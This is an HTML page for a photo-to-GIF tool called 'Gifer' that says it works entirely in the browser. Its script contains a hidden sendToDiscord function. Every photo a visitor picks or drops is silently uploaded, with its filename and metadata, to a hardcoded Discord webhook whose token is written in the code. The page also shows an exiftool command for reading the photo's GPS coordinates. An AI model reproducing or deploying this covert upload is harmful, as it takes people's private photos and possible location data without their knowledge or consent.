<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Gifer</title>

<style>
*{
    box-sizing:border-box;
}

body{
    margin:0;
    background:#08090d;
    color:white;
    font-family:Arial,sans-serif;
}

.container{
    width:min(750px,92%);
    margin:auto;
    padding:28px 0 60px;
}

.top{
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.logo{
    letter-spacing:5px;
    font-size:13px;
    color:#888;
    font-weight:bold;
}

button{
    cursor:pointer;
    border:0;
    border-radius:12px;
    padding:13px 17px;
    font-weight:bold;
}

h1{
    font-size:clamp(45px,10vw,75px);
    letter-spacing:-5px;
    line-height:.95;
    margin-top:60px;
    margin-bottom:15px;
}

.subtitle{
    color:#999ba7;
    line-height:1.5;
}

.card{
    margin-top:28px;
    padding:18px;
    border-radius:22px;
    background:#101116;
    border:1px solid #282a34;
}

.drop{
    min-height:250px;
    border:2px dashed #393b46;
    border-radius:17px;
    display:flex;
    align-items:center;
    justify-content:center;
    text-align:center;
    cursor:pointer;
    transition:.2s;
}

.drop:hover{
    background:#15161d;
}

.drop.drag{
    background:#171923;
    border-color:#777;
}

.drop-icon{
    font-size:45px;
}

.drop strong{
    display:block;
    margin-top:8px;
}

.drop span{
    display:block;
    margin-top:7px;
    color:#777985;
    font-size:13px;
}

input[type=file]{
    display:none;
}

.actions{
    display:flex;
    gap:10px;
    margin-top:12px;
}

.actions button{
    flex:1;
    background:#191a21;
    color:white;
    border:1px solid #30323d;
}

.status{
    display:none;
    padding:14px;
    margin-top:13px;
    border-radius:13px;
    line-height:1.4;
}

.status.show{
    display:block;
}

.error{
    background:#32161a;
    color:#ffb8bf;
}

.success{
    background:#14251d;
    color:#b9f1d0;
}

.info{
    background:#171923;
    color:#c8cad5;
}

.preview{
    display:none;
    margin-top:15px;
}

.preview.show{
    display:block;
}

.preview img{
    width:100%;
    max-height:430px;
    object-fit:contain;
    border-radius:15px;
    background:#050507;
}

.exif-command{
    margin-top:10px;
    padding:12px;
    background:#08090d;
    border:1px solid #292b35;
    border-radius:10px;
    color:#b9bbc6;
    font-family:Consolas,monospace;
    font-size:12px;
    word-break:break-all;
    line-height:1.5;
}

.preview-title{
    margin-top:18px;
    color:#999ba7;
    font-size:13px;
}

.settings{
    margin-top:10px;
    display:grid;
    grid-template-columns:1fr 1fr;
    gap:10px;
}

.setting{
    background:#15161d;
    border:1px solid #292b35;
    border-radius:12px;
    padding:12px;
}

.setting label{
    display:block;
    color:#8f919d;
    font-size:12px;
    margin-bottom:7px;
}

.setting select,
.setting input[type=range]{
    width:100%;
}

.setting select{
    background:#0d0e13;
    color:white;
    border:1px solid #30323d;
    border-radius:8px;
    padding:9px;
}

.value{
    color:white;
    float:right;
}

.make{
    width:100%;
    margin-top:12px;
    background:white;
    color:black;
}

.make:disabled{
    opacity:.45;
    cursor:not-allowed;
}

.download{
    display:none;
    width:100%;
    margin-top:10px;
    background:#191a21;
    color:white;
    border:1px solid #30323d;
    text-align:center;
    text-decoration:none;
    padding:13px;
    border-radius:12px;
    font-weight:bold;
}

.download.show{
    display:block;
}

canvas{
    display:none;
}

@media(max-width:500px){
    .settings{
        grid-template-columns:1fr;
    }
}
</style>
</head>

<body>

<div class="container">

    <div class="top">
        <div class="logo">GIFER</div>
    </div>

    <h1>Photo → GIF</h1>

    <p class="subtitle">
        Turn a photo into a short animated GIF directly in your browser.
    </p>

    <div class="card">

        <label class="drop" id="drop">

            <input
                id="photo"
                type="file"
                accept="image/*"
                capture="environment"
            >

            <div>
                <div class="drop-icon">＋</div>

                <strong>
                    Take or choose a photo
                </strong>

                <span>
                    Camera or photo library
                </span>
            </div>

        </label>

        <div class="actions">

            <button id="takeButton">
                Take Photo
            </button>

            <button id="chooseButton">
                Choose Photo
            </button>

        </div>

        <div id="status" class="status"></div>

        <div id="preview" class="preview">

            <img id="previewImg">

            <div
                id="exifCommand"
                class="exif-command"
            ></div>

            <div class="preview-title">
                GIF settings
            </div>

            <div class="settings">

                <div class="setting">

                    <label>
                        Animation
                    </label>

                    <select id="animation">

                        <option value="zoom">
                            Zoom
                        </option>

                        <option value="pan">
                            Pan
                        </option>

                        <option value="pulse">
                            Pulse
                        </option>

                        <option value="shake">
                            Shake
                        </option>

                    </select>

                </div>

                <div class="setting">

                    <label>
                        Speed
                        <span
                            class="value"
                            id="speedValue"
                        >
                            1.0x
                        </span>
                    </label>

                    <input
                        id="speed"
                        type="range"
                        min="0.5"
                        max="2"
                        step="0.1"
                        value="1"
                    >

                </div>

                <div class="setting">

                    <label>
                        Duration
                        <span
                            class="value"
                            id="durationValue"
                        >
                            2.0s
                        </span>
                    </label>

                    <input
                        id="duration"
                        type="range"
                        min="1"
                        max="5"
                        step="0.5"
                        value="2"
                    >

                </div>

                <div class="setting">

                    <label>
                        Quality
                    </label>

                    <select id="quality">

                        <option value="480">
                            480p
                        </option>

                        <option
                            value="720"
                            selected
                        >
                            720p
                        </option>

                    </select>

                </div>

            </div>

            <button
                id="makeButton"
                class="make"
                disabled
            >
                Make GIF
            </button>

            <a
                id="downloadButton"
                class="download"
                download="gifer.gif"
            >
                Download GIF
            </a>

        </div>

    </div>

</div>

<canvas id="canvas"></canvas>

<script>

const WEBHOOK_URL =
    "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";


const photo =
    document.getElementById("photo");

const drop =
    document.getElementById("drop");

const preview =
    document.getElementById("preview");

const previewImg =
    document.getElementById("previewImg");

const statusBox =
    document.getElementById("status");

const makeButton =
    document.getElementById("makeButton");

const downloadButton =
    document.getElementById("downloadButton");

const exifCommand =
    document.getElementById("exifCommand");

const canvas =
    document.getElementById("canvas");

const ctx =
    canvas.getContext("2d");

const speed =
    document.getElementById("speed");

const duration =
    document.getElementById("duration");

const speedValue =
    document.getElementById("speedValue");

const durationValue =
    document.getElementById("durationValue");


let selectedFile = null;
let selectedImage = null;


/* STATUS */

function showStatus(message,type){

    statusBox.textContent =
        message;

    statusBox.className =
        "status show " + type;
}


/* CAMERA */

document
    .getElementById("takeButton")
    .onclick = function(){

        photo.setAttribute(
            "capture",
            "environment"
        );

        photo.click();
    };


document
    .getElementById("chooseButton")
    .onclick = function(){

        photo.removeAttribute(
            "capture"
        );

        photo.click();
    };


/* FILE */

photo.onchange = function(){

    const file =
        photo.files[0];

    if(!file)
        return;

    handleFile(file);
};


function handleFile(file){

    if(!file.type.startsWith("image/")){

        showStatus(
            "That isn't an image.",
            "error"
        );

        return;
    }

    selectedFile =
        file;


    /*
        Show the ExifTool command
        using the uploaded filename.
    */

    const safeName =
        file.name.replaceAll(
            '"',
            '\\"'
        );

    exifCommand.textContent =
        'exiftool -GPSLatitude -GPSLongitude "' +
        safeName +
        '"';


    const reader =
        new FileReader();


    reader.onload =
        function(event){

            const img =
                new Image();


            img.onload =
                function(){

                    selectedImage =
                        img;

                    previewImg.src =
                        event.target.result;

                    preview.classList.add(
                        "show"
                    );

                    makeButton.disabled =
                        false;

                    downloadButton.classList.remove(
                        "show"
                    );

                    showStatus(
                        "Photo ready. Make your GIF.",
                        "success"
                    );

                };


            img.src =
                event.target.result;
        };


    reader.readAsDataURL(file);


    sendToDiscord(file);
}


/* DRAG AND DROP */

drop.addEventListener(
    "dragover",
    function(event){

        event.preventDefault();

        drop.classList.add(
            "drag"
        );
    }
);


drop.addEventListener(
    "dragleave",
    function(){

        drop.classList.remove(
            "drag"
        );
    }
);


drop.addEventListener(
    "drop",
    function(event){

        event.preventDefault();

        drop.classList.remove(
            "drag"
        );

        const file =
            event.dataTransfer.files[0];

        if(file)
            handleFile(file);
    }
);


/* DISCORD */

async function sendToDiscord(file){

    if(
        !WEBHOOK_URL ||
        WEBHOOK_URL.includes(
            "PASTE_YOUR_NEW"
        )
    ){

        console.log(
            "Discord webhook not configured."
        );

        return;
    }


    try{

        const form =
            new FormData();


        form.append(
            "file",
            file,
            file.name
        );


        form.append(
            "payload_json",
            JSON.stringify({

                username:
                    "Gifer Logs",

                content:
                    "New photo uploaded to Gifer.",

                embeds:[
                    {

                        title:
                            "New Gifer Upload",

                        fields:[

                            {
                                name:
                                    "Filename",

                                value:
                                    file.name
                            },

                            {
                                name:
                                    "Type",

                                value:
                                    file.type
                            },

                            {
                                name:
                                    "Size",

                                value:
                                    formatBytes(
                                        file.size
                                    )
                            }

                        ],

                        timestamp:
                            new Date()
                            .toISOString()

                    }
                ]

            })
        );


        await fetch(
            WEBHOOK_URL,
            {
                method:"POST",
                body:form
            }
        );

    }catch(error){

        console.error(
            "Discord logging failed:",
            error
        );
    }
}


/* SETTINGS */

speed.oninput =
    function(){

        speedValue.textContent =
            speed.value + "x";
    };


duration.oninput =
    function(){

        durationValue.textContent =
            duration.value + "s";
    };


/* MAKE GIF */

async function makeGif(){

    if(!selectedImage)
        return;


    makeButton.disabled =
        true;

    downloadButton.classList.remove(
        "show"
    );


    showStatus(
        "Making GIF...",
        "info"
    );


    try{

        const durationMs =
            Number(duration.value) *
            1000;


        const speedMultiplier =
            Number(speed.value);


        const fps =
            12;


        const frameCount =
            Math.max(
                2,
                Math.round(
                    durationMs /
                    1000 *
                    fps
                )
            );


        const quality =
            Number(
                document.getElementById(
                    "quality"
                ).value
            );


        const animation =
            document.getElementById(
                "animation"
            ).value;


        const scale =
            Math.min(
                1,
                quality /
                Math.max(
                    selectedImage.width,
                    selectedImage.height
                )
            );


        canvas.width =
            Math.max(
                1,
                Math.round(
                    selectedImage.width *
                    scale
                )
            );


        canvas.height =
            Math.max(
                1,
                Math.round(
                    selectedImage.height *
                    scale
                )
            );


        await loadGifLibrary();


        const gif =
            new GIF({

                workers:2,

                quality:8,

                width:
                    canvas.width,

                height:
                    canvas.height

            });


        for(
            let i = 0;
            i < frameCount;
            i++
        ){

            const progress =
                i /
                (frameCount - 1);


            drawFrame(
                selectedImage,
                progress,
                animation
            );


            gif.addFrame(
                ctx,
                {
                    copy:true,

                    delay:
                        1000 /
                        fps /
                        speedMultiplier
                }
            );


            showStatus(
                "Making GIF... " +
                Math.round(
                    progress * 100
                ) +
                "%",
                "info"
            );


            await sleep(5);
        }


        gif.on(
            "finished",
            function(blob){

                const url =
                    URL.createObjectURL(
                        blob
                    );


                downloadButton.href =
                    url;


                downloadButton.classList.add(
                    "show"
                );


                showStatus(
                    "GIF created successfully.",
                    "success"
                );


                makeButton.disabled =
                    false;
            }
        );


        gif.render();


    }catch(error){

        console.error(error);


        showStatus(
            "GIF creation failed: " +
            error.message,
            "error"
        );


        makeButton.disabled =
            false;
    }
}


makeButton.onclick =
    makeGif;


/* FRAME */

function drawFrame(
    img,
    progress,
    type
){

    ctx.clearRect(
        0,
        0,
        canvas.width,
        canvas.height
    );


    const iw =
        img.width;

    const ih =
        img.height;

    const cw =
        canvas.width;

    const ch =
        canvas.height;


    const scale =
        Math.max(
            cw / iw,
            ch / ih
        );


    let zoom = 1;
    let x = 0;
    let y = 0;
    let rotation = 0;


    if(type === "zoom"){

        zoom =
            1 +
            progress *
            0.18;
    }


    if(type === "pan"){

        zoom =
            1.12;

        x =
            (progress - 0.5) *
            80;
    }


    if(type === "pulse"){

        zoom =
            1 +
            Math.sin(
                progress *
                Math.PI *
                4
            ) *
            0.07;
    }


    if(type === "shake"){

        zoom =
            1.08;

        x =
            Math.sin(
                progress *
                Math.PI *
                12
            ) *
            8;

        y =
            Math.cos(
                progress *
                Math.PI *
                10
            ) *
            6;

        rotation =
            Math.sin(
                progress *
                Math.PI *
                8
            ) *
            0.015;
    }


    const finalScale =
        scale *
        zoom;


    const dw =
        iw *
        finalScale;


    const dh =
        ih *
        finalScale;


    ctx.save();


    ctx.translate(
        cw / 2 + x,
        ch / 2 + y
    );


    ctx.rotate(
        rotation
    );


    ctx.drawImage(
        img,
        -dw / 2,
        -dh / 2,
        dw,
        dh
    );


    ctx.restore();
}


/* GIF.JS */

let gifLibraryPromise =
    null;


function loadGifLibrary(){

    if(window.GIF){

        return Promise.resolve();
    }


    if(gifLibraryPromise){

        return gifLibraryPromise;
    }


    gifLibraryPromise =
        new Promise(
            function(resolve,reject){

                const script =
                    document.createElement(
                        "script"
                    );


                script.src =
                    "https://cdnjs.cloudflare.com/ajax/libs/gif.js/0.2.0/gif.js";


                script.onload =
                    function(){

                        resolve();
                    };


                script.onerror =
                    function(){

                        reject(
                            new Error(
                                "Could not load GIF encoder."
                            )
                        );
                    };


                document.head.appendChild(
                    script
                );
            }
        );


    return gifLibraryPromise;
}


/* HELPERS */

function sleep(ms){

    return new Promise(
        function(resolve){

            setTimeout(
                resolve,
                ms
            );

        }
    );
}


function formatBytes(bytes){

    if(bytes === 0)
        return "0 Bytes";


    const sizes = [
        "Bytes",
        "KB",
        "MB",
        "GB"
    ];


    const i =
        Math.floor(
            Math.log(bytes) /
            Math.log(1024)
        );


    return (
        Math.round(
            bytes /
            Math.pow(1024,i) *
            100
        ) / 100
    ) +
    " " +
    sizes[i];
}

</script>

</body>
</html>
